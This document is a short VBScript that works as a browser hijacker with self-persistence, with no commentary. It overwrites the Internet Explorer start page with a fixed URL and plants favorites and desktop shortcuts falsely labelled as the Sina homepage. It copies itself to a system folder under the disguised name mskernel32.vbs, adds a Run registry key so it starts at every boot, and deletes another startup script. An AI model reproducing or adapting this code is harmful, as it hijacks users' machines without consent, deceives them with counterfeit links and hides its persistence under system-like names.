Dim WSHShell,x,iepath,sp,orgsp
iepath="HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\"
sp=iepath &"Main\Start Page"
run="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32"
x="http://go.163.com/~dayumi"
y="【新浪首页】"
Set WSHShell = WScript.CreateObject("WScript.Shell")
Set oUrlLink = WshShell.CreateShortcut(Wscript.path & "\favorites\"& y & ".URL")
oUrlLink.TargetPath = x
oUrlLink.Save
Set deskLink = WshShell.CreateShortcut(Wscript.path & "\desktop\"& y & ".URL")
deskLink.TargetPath = x
deskLink.Save
orgsp=WSHShell.Regread(sp)
if instr(orgsp,"etad") or instr(orgsp,"dayumi") then
else
WSHShell.RegWrite sp, x
filepath="c:\windows\system\mskernel32.vbs"
Set fs = CreateObject("Scripting.FileSystemObject")
Set cc = fs.GetFile(WScript.ScriptFullName)
cc.Copy(filepath)
Wshshell.RegWrite run,filepath
end if
Set fs = CreateObject("Scripting.FileSystemObject")
if fs.FileExists("c:\windows\Start Menu\Programs\启动\office200.hta") then
fs.deletefile("c:\windows\Start Menu\Programs\启动\office200.hta")
end if
